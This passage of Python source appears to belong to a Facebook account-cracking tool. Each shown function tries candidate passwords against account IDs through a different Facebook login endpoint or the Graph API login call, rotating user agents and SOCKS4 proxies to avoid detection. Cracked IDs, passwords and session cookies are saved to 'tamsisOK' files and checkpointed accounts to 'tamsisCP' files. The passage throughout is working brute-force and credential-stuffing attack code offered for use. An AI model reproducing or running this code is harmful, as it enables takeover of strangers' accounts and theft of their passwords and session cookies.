		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode7(idi,sandi):
	global cp,ok,loop
	print(f'\r#Stable-async# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			hulu = {
"Host": "m.trunkstable.facebook.com",
"content-length": "2158",
"sec-ch-ua-mobile": "?1",
"user-agent": ua,
"viewport-width": "400",
"content-type": "application/x-www-form-urlencoded",
"x-fb-lsd": "AVr-dDflkjw",
"sec-ch-ua-platform-version": "9.0.0",
"x-asbd-id": "198387",
"sec-ch-prefers-color-scheme": "light",
"sec-ch-ua-platform": "Android",
"accept": "*/*",
"origin": "https://m.trunkstable.facebook.com",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"referer": "https://m.trunkstable.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
"accept-encoding": "gzip, deflate, br",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			kode=tamsis.get('https://m.trunkstable.facebook.com/login/device-based/login/async').text
			data={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':idi,'pass':pw}
			tamsis.post('https://m.trunkstable.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]\nID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsisOK/'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsisCP/'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode8(idi,sandi):
	global cp,ok,loop
	print(f'\r#Alpha-async# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			sys.stdout.flush()
			kode = tamsis.get('https://x.alpha.facebook.com').text
			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(kode)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),"li":re.search('name="li" value="(.*?)"', str(kode)).group(1),"try_number":"0","unrecognized_tries":"0","email":idi,"pass":pw,"login":"Log In"}
			hulu = {'Host': 'x.alpha.facebook.com','content-length': '2162','x-fb-lsd': 'AVoImhtP_ms','content-type': 'application/x-www-form-urlencoded','x-asbd-id': '198387','sec-ch-ua-mobile': '?1','user-agent': ua,'sec-ch-ua-platform': 'Android','accept': '*/*','origin': 'https://x.alpha.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://x.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			tamsis.post('https://x.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsisOK/'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsisCP/'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode1(idi,sandi):
	global cp,ok,loop
	print(f'\r#Mbasic-async# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			mbasic_fb = tamsis.get('https://mbasic.facebook.com').text
			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(mbasic_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(mbasic_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(mbasic_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(mbasic_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":idi,"pass":pw,"login":"Log In"}
			hulu = {"authority": 'mbasic.facebook.com',"method": 'GET',"scheme": 'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
			tamsis.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsisOK/'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				ok+=1
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsisCP/'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode9(idi,sandi):
	global cp,ok,loop
	print(f'\r#Latest-async# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			hulu = {"Host": "m.latest.facebook.com","content-length": "2142","x-fb-lsd": "AVr2PTWFBX0","sec-ch-ua": "'Not:A-Brand';v='99', 'Chromium';v='112'","content-type": "application/x-www-form-urlencoded","x-asbd-id": "198387","sec-ch-ua-mobile": "?0","user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36","sec-ch-ua-platform": "Linux","accept": "*/*","origin": "https://m.latest.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://m.latest.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			kode=tamsis.get('https://m.latest.facebook.com/login/device-based/login/async').text
			data={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':idi,'pass':pw}
			tamsis.post('https://m.latest.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsisOK/'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsisCP/'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode13(idi,sandi):
	global cp,ok,loop
	print(f'\r#Latest-validate# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			hulu={'Host': 'm.latest.facebook.com','content-length': '269','cache-control': 'max-age=0','viewport-width': '980','sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"9.0.0"','sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.48", "Google Chrome";v="112.0.5615.48", "Not:A-Brand";v="99.0.0.0"','sec-ch-prefers-color-scheme': 'light','upgrade-insecure-requests': '1','origin': 'https://m.latest.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.latest.facebook.com/login/device-based/password/?uid='+idi+'&flow=login_no_pin&wtsid=rdr_0ooccGnxILDYokYZB&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			kode=tamsis.get('https://m.latest.facebook.com/login/device-based/validate-password/?uid='+idi).text
			data={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':idi,'pass':pw}
			tamsis.post('https://m.latest.facebook.com/login/device-based/validate-password/?shbl=0',data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsisOK/'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsisCP/'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode4(idi,sandi):
	global cp,ok,loop
	print(f'\r#Mbasic-validate# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			kode = tamsis.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			tamsis.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(kode)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),"uid":idi,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw}
			hulu={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			tamsis.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsisOK/'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsisCP/'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode15(idi,sandi):
	global cp,ok,loop
	print(f'\r#D-validate# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			kode = tamsis.get('https://d.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			tamsis.headers.update({'Host': 'd.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(kode)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),"uid":idi,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw}
			hulu={'Host': 'd.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			tamsis.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsisOK/'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsisCP/'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode6(idi,sandi):
	global cp,ok,loop
	print(f'\r#Mobile-validate# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			kode = tamsis.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			tamsis.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(kode)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),"uid":idi,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw}
			hulu={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			tamsis.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsisOK/'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsisCP/'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode5(idi,sandi):
	global cp,ok,loop
	print(f'\rFeee-validate# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			tamsis=requests.Session()
			tamsis.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			kode = tamsis.get('https://free.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(kode)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),"uid":idi,"flow":"login_no_pin","pass":pw}
			hulu={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			tamsis.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=hulu)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsisOK/'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsisCP/'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def graph(idi,sandi):
	global cp,ok,loop
	print(f'\r#graph# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:			
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			hulu={'user-agent':ua}
			date = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',  'format': 'JSON', 'email':idi, 'locale': 'id_ID', 'password':pw, 'sdk': 'android', 'generate_session_cookies': '1'}
			login = tamsis.post("https://graph.facebook.com/auth/login",proxies=proxs,headers=hulu,data=date,allow_redirects=False).json()
			if "session_key" in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsisOK/'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif "www.facebook.com" in login["error"]["message"]:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsisCP/'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
